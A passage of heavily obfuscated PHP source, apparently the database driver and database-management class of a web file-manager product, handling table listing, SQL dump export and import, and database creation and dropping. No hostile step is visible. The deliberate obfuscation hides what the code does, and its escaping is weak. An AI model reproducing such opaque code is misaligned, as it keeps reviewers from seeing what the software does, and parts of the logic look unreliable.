strtoupper($ÒäÆ˜‰•) . $­‘Ôï”ê[1027] . strtoupper($ÒäÆ˜‰•) . $­‘Ôï”ê[1028]; break; case $­‘Ôï”ê[1029]: $½ö™îóÓ = $­‘Ôï”ê[1030] . $ÒäÆ˜‰• . $­‘Ôï”ê[1031]; break; case $­‘Ôï”ê[1004]: break; case $­‘Ôï”ê[1032]: default: $½ö™îóÓ = $­‘Ôï”ê[1033] . ($this->dbType == $­‘Ôï”ê[1032] ? "\x60{$ÒäÆ˜‰•}\x60" : $ÒäÆ˜‰•); } } $ª¬Å ·Ë = $this->query($½ö™îóÓ); $øİè©Ñü = array(); if ($ª¬Å ·Ë) { foreach ($ª¬Å ·Ë as $“ü•Ã×« => $Øû¤÷Ÿ) { $Øû¤÷Ÿ = array_change_key_case($Øû¤÷Ÿ); $Øû¤÷Ÿ[$­‘Ôï”ê[32]] = isset($Øû¤÷Ÿ[$­‘Ôï”ê[32]]) ? $Øû¤÷Ÿ[$­‘Ôï”ê[32]] : $­‘Ôï”ê[454]; $Øû¤÷Ÿ[$­‘Ôï”ê[33]] = isset($Øû¤÷Ÿ[$­‘Ôï”ê[33]]) ? $Øû¤÷Ÿ[$­‘Ôï”ê[33]] : $­‘Ôï”ê[454]; $ğå”Ô²œ = isset($Øû¤÷Ÿ[$­‘Ôï”ê[350]]) ? $Øû¤÷Ÿ[$­‘Ôï”ê[350]] : $Øû¤÷Ÿ[$­‘Ôï”ê[32]]; $øİè©Ñü[$ğå”Ô²œ] = array($­‘Ôï”ê[32] => $ğå”Ô²œ, $­‘Ôï”ê[33] => $Øû¤÷Ÿ[$­‘Ôï”ê[33]], $­‘Ôï”ê[35] => (bool) (isset($Øû¤÷Ÿ[$­‘Ôï”ê[106]]) && $Øû¤÷Ÿ[$­‘Ôï”ê[106]] === $­‘Ôï”ê[12] || isset($Øû¤÷Ÿ[$­‘Ôï”ê[35]]) && $Øû¤÷Ÿ[$­‘Ôï”ê[35]] === $­‘Ôï”ê[12]), $­‘Ôï”ê[37] => isset($Øû¤÷Ÿ[$­‘Ôï”ê[37]]) ? $Øû¤÷Ÿ[$­‘Ôï”ê[37]] : (isset($Øû¤÷Ÿ[$­‘Ôï”ê[56]]) ? $Øû¤÷Ÿ[$­‘Ôï”ê[56]] : $­‘Ôï”ê[454]), $­‘Ôï”ê[39] => isset($Øû¤÷Ÿ[$­‘Ôï”ê[97]]) ? strtolower($Øû¤÷Ÿ[$­‘Ôï”ê[97]]) == $­‘Ôï”ê[41] : (isset($Øû¤÷Ÿ[$­‘Ôï”ê[57]]) ? $Øû¤÷Ÿ[$­‘Ôï”ê[57]] : !1), $­‘Ôï”ê[42] => isset($Øû¤÷Ÿ[$­‘Ôï”ê[1034]]) ? strtolower($Øû¤÷Ÿ[$­‘Ôï”ê[1034]]) == $­‘Ôï”ê[44] : (isset($Øû¤÷Ÿ[$­‘Ôï”ê[97]]) ? $Øû¤÷Ÿ[$­‘Ôï”ê[97]] : !1)); } } return $øİè©Ñü; } public function getTables($ôÊõòÈô = '') { $³ää³…À =& $_SERVER[¿ğÚ‰±–]; if (think_config($³ää³…À[1035])) { $²ñÏñ™ó = str_replace($³ää³…À[1036], $ôÊõòÈô, think_config($³ää³…À[1035])); } else { switch ($this->dbType) { case $³ää³…À[1003]: case $³ää³…À[1005]: $²ñÏñ™ó = $³ää³…À[1037]; break; case $³ää³…À[1002]: case $³ää³…À[1020]: $²ñÏñ™ó = $³ää³…À[1038]; break; case $³ää³…À[1029]: $²ñÏñ™ó = $³ää³…À[1039]; break; case $³ää³…À[1004]: think_exception(think_lang($³ää³…À[1040]) . $³ää³…À[1041]); break; case $³ää³…À[1021]: $²ñÏñ™ó = $³ää³…À[45] . $³ää³…À[46] . $³ää³…À[47]; break; case $³ää³…À[1032]: default: if (!empty($ôÊõòÈô)) { $²ñÏñ™ó = $³ää³…À[984] . $ôÊõòÈô . $³ää³…À[985]; } else { $²ñÏñ™ó = $³ää³…À[986]; } } } $­×ê˜Å¿ = $this->query($²ñÏñ™ó); $å‡©¨µÁ = array(); foreach ($­×ê˜Å¿ as $ÀÌ‚—‡ò => $±öÆÑÒ) { $å‡©¨µÁ[$ÀÌ‚—‡ò] = current($±öÆÑÒ); } return $å‡©¨µÁ; } protected function parseLimit($–èÁÜÌ‘) { $Åƒ°Ï¼ı =& $_SERVER[¿ğÚ‰±–]; $Ï©š«”Æ = $Åƒ°Ï¼ı[12]; if (!empty($–èÁÜÌ‘)) { switch ($this->dbType) { case $Åƒ°Ï¼ı[1029]: case $Åƒ°Ï¼ı[1021]: $–èÁÜÌ‘ = explode($Åƒ°Ï¼ı[50], $–èÁÜÌ‘); if (count($–èÁÜÌ‘) > 1) { $Ï©š«”Æ .= $Åƒ°Ï¼ı[51] . $–èÁÜÌ‘[1] . $Åƒ°Ï¼ı[52] . $–èÁÜÌ‘[0] . $Åƒ°Ï¼ı[53]; } else { $Ï©š«”Æ .= $Åƒ°Ï¼ı[51] . $–èÁÜÌ‘[0] . $Åƒ°Ï¼ı[53]; } break; case $Åƒ°Ï¼ı[1002]: case $Åƒ°Ï¼ı[1020]: break; case $Åƒ°Ï¼ı[1004]: break; case $Åƒ°Ï¼ı[1003]: case $Åƒ°Ï¼ı[1005]: break; case $Åƒ°Ï¼ı[1032]: default: $Ï©š«”Æ .= $Åƒ°Ï¼ı[51] . $–èÁÜÌ‘ . $Åƒ°Ï¼ı[53]; } } return $Ï©š«”Æ; } public function parseKey(&$ï–·³¡ü, $¬½€ŞèÏ = true) { $˜‘úö¿² =& $_SERVER[¿ğÚ‰±–]; if ($¬½€ŞèÏ) { $ï–·³¡ü = $this->parseKeyCheck($ï–·³¡ü); } if ($this->dbType == $˜‘úö¿²[1032]) { if ($ï–·³¡ü != $˜‘úö¿²[220] && !preg_match($˜‘úö¿²[996], $ï–·³¡ü)) { $ï–·³¡ü = $˜‘úö¿²[461] . trim($ï–·³¡ü, $˜‘úö¿²[461]) . $˜‘úö¿²[461]; } return $ï–·³¡ü; } else { return parent::parseKey($ï–·³¡ü, $¬½€ŞèÏ); } } public function close() { $this->_linkID = null; } public function error() { $†‹à† =& $_SERVER[¿ğÚ‰±–]; if ($this->PDOStatement) { $à±å¦ŸÍ = $this->PDOStatement->errorInfo(); $this->error = $à±å¦ŸÍ[1] . $†‹à†[4] . $à±å¦ŸÍ[2]; } else { $this->error = $†‹à†[12]; } if ($†‹à†[12] != $this->queryStr) { $this->error .= LNG($†‹à†[48]) . $this->queryStr; } think_trace($this->error, $†‹à†[12], $†‹à†[49]); return $this->error; } public function escapeString($›áÈİÕÜ) { $¶âúÎ‹Ñ =& $_SERVER[¿ğÚ‰±–]; switch ($this->dbType) { case $¶âúÎ‹Ñ[1029]: case $¶âúÎ‹Ñ[1002]: case $¶âúÎ‹Ñ[1020]: case $¶âúÎ‹Ñ[1032]: return addslashes($›áÈİÕÜ); case $¶âúÎ‹Ñ[1004]: case $¶âúÎ‹Ñ[1021]: case $¶âúÎ‹Ñ[1003]: case $¶âúÎ‹Ñ[1005]: return str_ireplace($¶âúÎ‹Ñ[58], $¶âúÎ‹Ñ[59], $›áÈİÕÜ); } } protected function parseValue($±ÊŠËäÊ) { $†¿è ÷ =& $_SERVER[¿ğÚ‰±–]; if (is_string($±ÊŠËäÊ)) { $–’¯·Ğ = strpos($±ÊŠËäÊ, $†¿è ÷[4]) === 0 && in_array($±ÊŠËäÊ, array_keys($this->bind)); $±ÊŠËäÊ = $–’¯·Ğ ? $this->escapeString($±ÊŠËäÊ) : $†¿è ÷[1042] . $this->escapeString($±ÊŠËäÊ) . $†¿è ÷[1042]; } elseif (isset($±ÊŠËäÊ[0]) && is_string($±ÊŠËäÊ[0]) && strtolower($±ÊŠËäÊ[0]) == $†¿è ÷[373]) { $±ÊŠËäÊ = $this->escapeString($±ÊŠËäÊ[1]); } elseif (is_array($±ÊŠËäÊ)) { $±ÊŠËäÊ = array_map(array($this, $†¿è ÷[1043]), $±ÊŠËäÊ); } elseif (is_bool($±ÊŠËäÊ)) { $±ÊŠËäÊ = $±ÊŠËäÊ ? $†¿è ÷[91] : $†¿è ÷[228]; } elseif (is_null($±ÊŠËäÊ)) { $±ÊŠËäÊ = $†¿è ÷[106]; } return $±ÊŠËäÊ; } public function getLastInsertId() { $ÓÙ÷ÖÅ =& $_SERVER[¿ğÚ‰±–]; switch ($this->dbType) { case $ÓÙ÷ÖÅ[1029]: case $ÓÙ÷ÖÅ[1021]: case $ÓÙ÷ÖÅ[1002]: case $ÓÙ÷ÖÅ[1020]: case $ÓÙ÷ÖÅ[1004]: case $ÓÙ÷ÖÅ[1032]: return $this->_linkID->lastInsertId(); case $ÓÙ÷ÖÅ[1003]: case $ÓÙ÷ÖÅ[1005]: $ı¬¢Æ—Û = $this->table; $–ÇÒúÕ’ = $this->query("\x53\105\x4c\105\x43\124\40{$ı¬¢Æ—Û}\x2e\143\165\162\x72\x76\x61\154\x20\x63\165\162\x72\x76\x61\x6c\x20\x46\x52\117\x4d\40\x64\165\x61\x6c"); return $–ÇÒúÕ’ ? $–ÇÒúÕ’[0][$ÓÙ÷ÖÅ[1044]] : 0; } } } goto C£¬²¦Æî¿; a–‰àì‡Ï¨: class DbManage { function __construct($´ö‹åéë = array()) { $åÊĞÔ¡ =& $_SERVER[¿ğÚ‰±–]; if (empty($´ö‹åéë)) { $´ö‹åéë = $GLOBALS[$åÊĞÔ¡[6]][$åÊĞÔ¡[21]]; } $this->database = $´ö‹åéë; } public function model($®†„øüş = '') { return new ModelBase($®†„øüş, $_SERVER[¿ğÚ‰±–][12], $this->database); } public function db($¾ÈŸ´—– = false) { $ÁºÏààœ =& $_SERVER[¿ğÚ‰±–]; $ÉƒÀ·Õê = array_change_key_case($this->database); if ($this->dbType() == $ÁºÏààœ[13] || !$¾ÈŸ´—–) { return $this->model()->db(); } $£¼èä = $ÉƒÀ·Õê[$ÁºÏààœ[1057]]; $ÉƒÀ·Õê[$ÁºÏààœ[1057]] = $ÁºÏààœ[12]; if ($ÉƒÀ·Õê[$ÁºÏààœ[1052]] == $ÁºÏààœ[1049]) { $Åµæñäö = $ÉƒÀ·Õê[$ÁºÏààœ[1058]]; $ÉƒÀ·Õê[$ÁºÏààœ[1058]] = substr($Åµæñäö, 0, strrpos($Åµæñäö, $ÁºÏààœ[1144])); } $this->database = $ÉƒÀ·Õê; $á¡àûû = $this->model()->db(); try { $´­Ÿï•é = $á¡àûû->execute("\x73\x68\157\167\40\x64\141\x74\141\x62\141\163\145\163\40\154\x69\153\145\x20\x27{$£¼èä}\47"); } catch (Exception $Œ¨Šõ¿‚) { } if (!$´­Ÿï•é) { $á¡àûû->execute("\143\162\x65\x61\164\x65\x20\144\141\164\x61\x62\141\x73\x65\40\140{$£¼èä}\140"); } $ÉƒÀ·Õê[$ÁºÏààœ[1057]] = $£¼èä; if ($ÉƒÀ·Õê[$ÁºÏààœ[1052]] == $ÁºÏààœ[1049]) { $ÉƒÀ·Õê[$ÁºÏààœ[1058]] .= $ÁºÏààœ[1144] . $£¼èä; } $this->database = $ÉƒÀ·Õê; $á¡àûû->execute("\165\163\x65\x20\140{$£¼èä}\x60"); return $á¡àûû; } public function createTable($¤­Ô¼¥‹, &$ÈÂõ¥„ş) { $œÜ¡ù²ß =& $_SERVER[¿ğÚ‰±–]; if (!IO::exist($¤­Ô¼¥‹)) { ActionCall($œÜ¡ù²ß[1145], !0, 0); show_json(LNG($œÜ¡ù²ß[1146]), !1); } $…À¹‡Ëˆ = $this->model()->db(); $Ü¡®çóÕ = sqlSplit(IO::getContent($¤­Ô¼¥‹)); foreach ($Ü¡®çóÕ as $¨àÛ´³) { $îùÀ¿Éí = stripos($¨àÛ´³, $œÜ¡ù²ß[1147]) === 0; if ($îùÀ¿Éí) { $ÈÂõ¥„ş->task[$œÜ¡ù²ß[1148]] += 1; } $…À¹‡Ëˆ->execute($¨àÛ´³); if ($îùÀ¿Éí) { preg_match($œÜ¡ù²ß[1149], $¨àÛ´³, $Šµ¹‚„ù); $ÈÂõ¥„ş->task[$œÜ¡ù²ß[1150]] = $Šµ¹‚„ù[1]; $ÈÂõ¥„ş->update(1); } } } public function insertTable($ÀÑ›ˆĞ, &$á„ÊöÏ) { $Œõë¬çß =& $_SERVER[¿ğÚ‰±–]; $¡£‹¸–ù = $this->model()->db(); $íŸêœ¦« = $»ãÕÀÖŸ ? array($»ãÕÀÖŸ) : $¡£‹¸–ù->getTables(); foreach ($ÀÑ›ˆĞ as $°çƒ¼Êù) { $»ãÕÀÖŸ = basename($°çƒ¼Êù, $Œõë¬çß[866]); if (!in_array($»ãÕÀÖŸ, $íŸêœ¦«)) { continue; } $á„ÊöÏ->task[$Œõë¬çß[1150]] = $»ãÕÀÖŸ; if (get_filesize($°çƒ¼Êù) == 0) { continue; } $”Î”×“ì = $this->sqlToDb($°çƒ¼Êù, $á„ÊöÏ); if (!$”Î”×“ì) { ActionCall($Œõë¬çß[1145], !0, 0); show_json(LNG($Œõë¬çß[1151]) . "\133{$»ãÕÀÖŸ}\135", !1); } } } public function sqlFromDb($’•Í”, $™åó¡Èå, &$êèÀÅ—, $’óŞ¦² = '') { if ($êèÀÅ—) { $êèÀÅ—->task[$_SERVER[¿ğÚ‰±–][1150]] = $’•Í”; } $ñ¢«ÈšÕ = $this->model($’•Í”); $¹Í›œŞ« = 0; $Â‰Ğâªà = 0; $øó¾–ƒÅ = 10000; $ÖÇ¡ ’¡ = fopen($™åó¡Èå, $_SERVER[¿ğÚ‰±–][1152]); $€±Å ‹Â = $ñ¢«ÈšÕ->getPk(); $â¤§¹ ¬ = $ñ¢«ÈšÕ->getDbFields(); $é¾€¤®Œ = $_SERVER[¿ğÚ‰±–][12]; if ($GLOBALS[$_SERVER[¿ğÚ‰±–][865]] && in_array($’•Í”, array($_SERVER[¿ğÚ‰±–][1153], $_SERVER[¿ğÚ‰±–][1154]))) { $é¾€¤®Œ = $’•Í”; } do { $€Ì•ŠÈŸ = array($€±Å ‹Â => array($_SERVER[¿ğÚ‰±–][1099], $Â‰Ğâªà)); $÷øàÛåŠ = $ñ¢«ÈšÕ->where($€Ì•ŠÈŸ)->field($â¤§¹ ¬)->order($€±Å ‹Â . $_SERVER[¿ğÚ‰±–][1155])->limit($øó¾–ƒÅ)->select(); $÷øàÛåŠ = !empty($÷øàÛåŠ) ? $÷øàÛåŠ : array(); if (!($‘Ş›‹˜ = count($÷øàÛåŠ))) { break; } $»†šÄ· = end($÷øàÛåŠ); $Â‰Ğâªà = $»†šÄ·[$€±Å ‹Â]; $ôÉò¬š = array(); foreach ($÷øàÛåŠ as $òÜì¡Ãú) { if ($é¾€¤®Œ) { if ($’•Í” == $_SERVER[¿ğÚ‰±–][1153]) { if ($òÜì¡Ãú[$_SERVER[¿ğÚ‰±–][33]] == $_SERVER[¿ğÚ‰±–][1156]) { $ŒÕßÒ¿´ = json_decode($òÜì¡Ãú[$_SERVER[¿ğÚ‰±–][450]], !0); if ($ŒÕßÒ¿´[$_SERVER[¿ğÚ‰±–][32]] == $GLOBALS[$_SERVER[¿ğÚ‰±–][865]] && $ŒÕßÒ¿´[$_SERVER[¿ğÚ‰±–][828]] != 1) { continue; } } } else { if ($òÜì¡Ãú[$_SERVER[¿ğÚ‰±–][33]] == $_SERVER[¿ğÚ‰±–][1157] && $òÜì¡Ãú[$_SERVER[¿ğÚ‰±–][97]] == $_SERVER[¿ğÚ‰±–][860]) { continue; } } } if ($’óŞ¦²) { $òÜì¡Ãú[$_SERVER[¿ğÚ‰±–][87]] = "\x7b\151\x6f\x3a{$’óŞ¦²}\175" . substr($òÜì¡Ãú[$_SERVER[¿ğÚ‰±–][87]], strlen("\x7b\151\157\72{$òÜì¡Ãú[$_SERVER[¿ğÚ‰±–][895]]}\175")); $òÜì¡Ãú[$_SERVER[¿ğÚ‰±–][895]] = $’óŞ¦²; } $ôÉò¬š[] = $_SERVER[¿ğÚ‰±–][1158] . $this->sqlEncode($òÜì¡Ãú) . $_SERVER[¿ğÚ‰±–][1159]; } $ãå¤í§´ = "\111\116\123\x45\122\124\x20\111\116\x54\x4f\x20\140{$’•Í”}\140\40\x28\x60" . implode($_SERVER[¿ğÚ‰±–][1160], $â¤§¹ ¬) . $_SERVER[¿ğÚ‰±–][1161]; fwrite($ÖÇ¡ ’¡, $ãå¤í§´ . implode($_SERVER[¿ğÚ‰±–][1162], $ôÉò¬š) . $_SERVER[¿ğÚ‰±–][74] . PHP_EOL); $¹Í›œŞ« += $‘Ş›‹˜; if ($êèÀÅ—) { $êèÀÅ—->update($‘Ş›‹˜); } } while ($øó¾–ƒÅ == $‘Ş›‹˜); fclose($ÖÇ¡ ’¡); return $¹Í›œŞ«; } public function sqlToDb($àö¥™´Ê, &$¨Ş…‚ Ü) { $Şş×¡ =& $_SERVER[¿ğÚ‰±–]; $ÏÏèò° = $this->model()->db(); $Ë¯åºÎ­ = @fopen($àö¥™´Ê, $Şş×¡[1163]); if (!$Ë¯åºÎ­) { return !1; } $›„ÙìÂ = 0; $ˆ÷¶Á‹æ = $Şş×¡[12]; $Øˆšà®œ = array(); $êîŸ¼ø´ = $this->dbType(); $›·ç = $êîŸ¼ø´ == $Şş×¡[13] ? 500 : 2000; $ôªÅùìŒ = basename($àö¥™´Ê, $Şş×¡[866]); $–¤úı = 0; $¶½œâÉ = 4194304; while (!feof($Ë¯åºÎ­)) { $€íâ¿Ïö = trim(fgets($Ë¯åºÎ­)); if (!$€íâ¿Ïö) { continue; } $«ô×± = $this->sqlDecode($€íâ¿Ïö, $êîŸ¼ø´, $ôªÅùìŒ); if (stripos($«ô×±, $Şş×¡[431]) === 0) { if (!$ˆ÷¶Á‹æ) { $ˆ÷¶Á‹æ = $«ô×± . $Şş×¡[53]; } continue; } if ($¨Ş…‚ Ü) { $¨Ş…‚ Ü->task[$Şş×¡[1148]] += 1; } $›„ÙìÂ++; $Øˆšà®œ[] = rtrim(rtrim(trim($«ô×±), $Şş×¡[50]), $Şş×¡[74]); $‹î©ßñ = null; $ñİ‚Áñ = strlen($«ô×±); $–¤úı += $ñİ‚Áñ; $áÊ¤÷è = strlen($ˆ÷¶Á‹æ) + $–¤úı + (count($Øˆšà®œ) - 1); if ($áÊ¤÷è >= $¶½œâÉ) { $‹î©ßñ = array_pop($Øˆšà®œ); if ($›„ÙìÂ > 1) { $›„ÙìÂ--; } } if ($›„ÙìÂ >= $›·ç || $‹î©ßñ) { $«ô×± = $ˆ÷¶Á‹æ . implode($Şş×¡[50], $Øˆšà®œ); if (!$ÏÏèò°->execute($«ô×±)) { return !1; } if ($¨Ş…‚ Ü) { $¨Ş…‚ Ü->update($›„ÙìÂ); } $Øˆšà®œ = array(); $›„ÙìÂ = 0; $–¤úı = 0; if ($‹î©ßñ) { $Øˆšà®œ = array($‹î©ßñ); $›„ÙìÂ = 1; $–¤úı = $ñİ‚Áñ; } } } fclose($Ë¯åºÎ­); if (!empty($Øˆšà®œ)) { $«ô×± = $ˆ÷¶Á‹æ . implode($Şş×¡[50], $Øˆšà®œ); if (!$ÏÏèò°->execute($«ô×±)) { return !1; } if ($¨Ş…‚ Ü) { $¨Ş…‚ Ü->update($›„ÙìÂ); } } return !0; } public function dropTable($œíµÔ = null) { $Åå¼ı× = $this->model()->db(); $ÔÉŠšë‘ = $œíµÔ ? array($œíµÔ) : $Åå¼ı×->getTables(); if (!$ÔÉŠšë‘) { return; } foreach ($ÔÉŠšë‘ as $œíµÔ) { if ($œíµÔ) { $œíµÔ = strtolower($œíµÔ); } else { continue; } $Åå¼ı×->execute("\x64\162\157\x70\x20\164\x61\142\x6c\x65\40\x69\x66\40\x65\x78\151\163\164\163\x20\x60{$œíµÔ}\x60"); } } private function sqlEncode($Åê»™ıÃ) { $»­õö°“ =& $_SERVER[¿ğÚ‰±–]; $µ˜‰©›¬ = array(); foreach ($Åê»™ıÃ as $ğêÉ¬¶‡) { if (is_array($ğêÉ¬¶‡)) { $ğêÉ¬¶‡ = json_encode_force($ğêÉ¬¶‡); } $ğêÉ¬¶‡ = addslashes($ğêÉ¬¶‡); $ğêÉ¬¶‡ = str_replace(array($»­õö°“[1164], $»­õö°“[262], $»­õö°“[418]), array($»­õö°“[1165], $»­õö°“[1166], $»­õö°“[1167]), $ğêÉ¬¶‡); $µ˜‰©›¬[] = $ğêÉ¬¶‡; } return $»­õö°“[58] . implode($»­õö°“[1168], $µ˜‰©›¬) . $»­õö°“[58]; } private function sqlDecode($Ğ‹æ¬, $£ÑæÙ“, $£Ô¬Ä÷ê = '') { $Ú×ö¼ =& $_SERVER[¿ğÚ‰±–]; $Ğ‹æ¬ = str_replace(array($Ú×ö¼[1165], $Ú×ö¼[1166], $Ú×ö¼[1167]), array($Ú×ö¼[1164], $Ú×ö¼[262], $Ú×ö¼[418]), $Ğ‹æ¬); if ($£ÑæÙ“ == $Ú×ö¼[13]) { $Ğ‹æ¬ = str_ireplace($Ú×ö¼[1169], $Ú×ö¼[59], $Ğ‹æ¬); $Ğ‹æ¬ = stripslashes($Ğ‹æ¬); } return preg_replace($Ú×ö¼[1170], $Ú×ö¼[12], $Ğ‹æ¬); if ($£ÑæÙ“ == $Ú×ö¼[13]) { return $£Ô¬Ä÷ê != $Ú×ö¼[1171] ? stripslashes($Ğ‹æ¬) : $Ğ‹æ¬; } if ($£Ô¬Ä÷ê == $Ú×ö¼[1171]) { $Ğ‹æ¬ = str_replace($Ú×ö¼[1172], $Ú×ö¼[121], stripslashes($Ğ‹æ¬)); } return $Ğ‹æ¬; } public function getSqlFile($ÅöÍı¤• = '') { $Èø¦›Ù =& $_SERVER[¿ğÚ‰±–]; $·“£à½¨ = $this->dbType(!0); $«’±ÇïÃ = CONTROLLER_DIR . "\151\156\163\x74\141\x6c\x6c\x2f\x64\141\164\x61\x2f{$·“£à½¨}\56\163\161\154"; $¡†ÕŒî = file_get_contents($«’±ÇïÃ); $ÅÁ“ã¼£ = $Èø¦›Ù[1173] . ($·“£à½¨ == $Èø¦›Ù[882] ? $Èø¦›Ù[1174] : $Èø¦›Ù[1175]) . $Èø¦›Ù[1176]; preg_match_all($ÅÁ“ã¼£, $¡†ÕŒî, $¼¬ºŠñ«); $Ë—¾å’ = $¼¬ºŠñ«[1]; $†œ‚ÒÉ¥ = $this->model()->db(); $Ï­•Ğ¦¶ = $†œ‚ÒÉ¥->getTables(); $…¾æáÀè = TEMP_FILES . $Èø¦›Ù[1177] . date($Èø¦›Ù[272]) . $Èø¦›Ù[8]; del_dir($…¾æáÀè); mk_dir($…¾æáÀè); $şµ×¦ÍÎ = $…¾æáÀè . $Èø¦›Ù[1178]; $‚ç™å´ = $…¾æáÀè . $Èø¦›Ù[1179]; $—¥õ¸Ïù = $·“£à½¨ == $Èø¦›Ù[13] ? $Èø¦›Ù[882] : $Èø¦›Ù[13]; IO::copy(CONTROLLER_DIR . "\151\156\x73\164\141\154\x6c\x2f\x64\x61\x74\141\x2f{$—¥õ¸Ïù}\x2e\163\161\x6c", $…¾æáÀè); @touch($…¾æáÀè . $·“£à½¨ . $Èø¦›Ù[866]); $°Ô¦İ› = fopen($şµ×¦ÍÎ, $Èø¦›Ù[1152]); $ŒÙé¯Áé = fopen($‚ç™å´, $Èø¦›Ù[1152]); if ($·“£à½¨ == $Èø¦›Ù[13]) { $Ï­•Ğ¦¶ = array_diff($Ï­•Ğ¦¶, array($Èø¦›Ù[858], $Èø¦›Ù[859])); $ºËÆ¶æ = array($Èø¦›Ù[1180], $Èø¦›Ù[1181], $Èø¦›Ù[1182]); fwrite($ŒÙé¯Áé, implode(PHP_EOL, $ºËÆ¶æ) . PHP_EOL . PHP_EOL); foreach ($Ï­•Ğ¦¶ as $ÅÓ‘Î–Ï) { $ƒ„ìñ’û = $this->sqlFromSqlite($ÅÓ‘Î–Ï); if (!$ƒ„ìñ’û[$Èø¦›Ù[13]]) { continue; } fwrite($ŒÙé¯Áé, $ƒ„ìñ’û[$Èø¦›Ù[13]] . PHP_EOL . PHP_EOL); if (!in_array($ÅÓ‘Î–Ï, $Ë—¾å’)) { fwrite($°Ô¦İ›, $ƒ„ìñ’û[$Èø¦›Ù[882]] . PHP_EOL . PHP_EOL); } } } else { foreach ($Ï­•Ğ¦¶ as $ÅÓ‘Î–Ï) { $ƒ„ìñ’û = $this->sqlFromMysql($ÅÓ‘Î–Ï); if (!$ƒ„ìñ’û[$Èø¦›Ù[882]]) { continue; } fwrite($°Ô¦İ›, $ƒ„ìñ’û[$Èø¦›Ù[882]] . PHP_EOL . PHP_EOL); if (!in_array($ÅÓ‘Î–Ï, $Ë—¾å’)) { fwrite($ŒÙé¯Áé, $ƒ„ìñ’û[$Èø¦›Ù[13]] . PHP_EOL . PHP_EOL); } } } fclose($°Ô¦İ›); fclose($ŒÙé¯Áé); $¡†ÕŒî = array($Èø¦›Ù[882] => $şµ×¦ÍÎ, $Èø¦›Ù[13] => $‚ç™å´); return $ÅöÍı¤• ? $¡†ÕŒî[$ÅöÍı¤•] : $¡†ÕŒî; } public function dbType($˜ò› † = false) { $£Í·ôÈ =& $_SERVER[¿ğÚ‰±–]; $Åùïø‡À = $˜ò› † ? $GLOBALS[$£Í·ôÈ[6]][$£Í·ôÈ[21]] : $this->database; $Åùïø‡À = array_change_key_case($Åùïø‡À); $óƒÀ´³± = $Åùïø‡À[$£Í·ôÈ[1052]]; if ($óƒÀ´³± == $£Í·ôÈ[1049]) { $Üœãœæİ = explode($£Í·ôÈ[4], $Åùïø‡À[$£Í·ôÈ[1058]]); $óƒÀ´³± = $Üœãœæİ[0]; } $Áº¬„¦  = array($£Í·ôÈ[1183] => $£Í·ôÈ[13], $£Í·ôÈ[997] => $£Í·ôÈ[882]); if (isset($Áº¬„¦ [$óƒÀ´³±])) { $óƒÀ´³± = $Áº¬„¦ [$óƒÀ´³±]; } return $óƒÀ´³±; } public function sqlFromMysql($ø‰§ö, $‹Îçô€Ã = '') { $ªÔÇ½š‚ =& $_SERVER[¿ğÚ‰±–]; $Ãø¡üÊ = $this->model()->db(); $¶÷¬Æê¨ = $Ãø¡üÊ->query($ªÔÇ½š‚[1184] . $ø‰§ö . $ªÔÇ½š‚[461]); if (!$¶÷¬Æê¨ || !$¶÷¬Æê¨[0]) { return !1; } $úÛà©ıÕ = _get($¶÷¬Æê¨[0], $ªÔÇ½š‚[1185], $ªÔÇ½š‚[12]); if (!$úÛà©ıÕ) { return !1; } $İæÊÉÒ´ = "\104\x52\x4f\120\x20\124\101\x42\114\105\40\x49\106\x20\105\x58\x49\123\x54\x53\x20\140{$ø‰§ö}\x60\73" . PHP_EOL . $úÛà©ıÕ . $ªÔÇ½š‚[74]; if ($‹Îçô€Ã && $‹Îçô€Ã == $ªÔÇ½š‚[882]) { return $İæÊÉÒ´; } $“†«İı¾ = array_change_key_case($GLOBALS[$ªÔÇ½š‚[6]][$ªÔÇ½š‚[21]]); $¨ÁŠÁ€ = $“†«İı¾[$ªÔÇ½š‚[1057]]; $ùÌ±ÑƒÊ = $ªÔÇ½š‚[1186] . $¨ÁŠÁ€ . $ªÔÇ½š‚[1187] . $ø‰§ö . $ªÔÇ½š‚[58]; $î‰ Æ÷ = $ªÔÇ½š‚[1188] . $ø‰§ö . $ªÔÇ½š‚[985]; $öîŸĞ³Ò = $Ãø¡üÊ->query($ùÌ±ÑƒÊ); if (empty($öîŸĞ³Ò)) { $êáÉ‰¿ = array($ªÔÇ½š‚[882] => $ªÔÇ½š‚[12], $ªÔÇ½š‚[13] => $ªÔÇ½š‚[12]); return $‹Îçô€Ã ? $êáÉ‰¿[$‹Îçô€Ã] : $êáÉ‰¿; } $Şí ÅÕ‹ = $Ãø¡üÊ->query($î‰ Æ÷); $¿õãÊò½ = $ªÔÇ½š‚[12]; $êò©ıï° = array(); foreach ($Şí ÅÕ‹ as $úØ¨ŸÔ¼) { if (!$¿õãÊò½ && $úØ¨ŸÔ¼[$ªÔÇ½š‚[1189]] == $ªÔÇ½š‚[1190]) { $¿õãÊò½ = $úØ¨ŸÔ¼[$ªÔÇ½š‚[1191]]; } if (isset($êò©ıï°[$úØ¨ŸÔ¼[$ªÔÇ½š‚[1189]]])) { $êò©ıï°[$úØ¨ŸÔ¼[$ªÔÇ½š‚[1189]]][$ªÔÇ½š‚[1192]][] = $úØ¨ŸÔ¼[$ªÔÇ½š‚[1191]]; continue; } $êò©ıï°[$úØ¨ŸÔ¼[$ªÔÇ½š‚[1189]]] = array($ªÔÇ½š‚[1193] => $úØ¨ŸÔ¼[$ªÔÇ½š‚[1189]], $ªÔÇ½š‚[1192] => array($úØ¨ŸÔ¼[$ªÔÇ½š‚[1191]]), $ªÔÇ½š‚[1194] => $úØ¨ŸÔ¼[$ªÔÇ½š‚[1195]] == $ªÔÇ½š‚[91] ? 0 : 1); } $¤ÆÖè ¨ = array(); foreach ($êò©ıï° as $úØ¨ŸÔ¼) { $Õü·‰¨¡ = $úØ¨ŸÔ¼[$ªÔÇ½š‚[1193]] == $ªÔÇ½š‚[1190]; $´†¾´œÀ = array($ªÔÇ½š‚[1196], $úØ¨ŸÔ¼[$ªÔÇ½š‚[1194]] == $ªÔÇ½š‚[91] && !$Õü·‰¨¡ ? $ªÔÇ½š‚[1197] : $ªÔÇ½š‚[12], $ªÔÇ½š‚[1198], $ªÔÇ½š‚[1199] . $ø‰§ö . $ªÔÇ½š‚[11] . ($Õü·‰¨¡ ? $ªÔÇ½š‚[1200] : $úØ¨ŸÔ¼[$ªÔÇ½š‚[1193]]) . $ªÔÇ½š‚[121], $ªÔÇ½š‚[1201], $ªÔÇ½š‚[121] . $ø‰§ö . $ªÔÇ½š‚[121], $ªÔÇ½š‚[1202] . implode($ªÔÇ½š‚[1203], 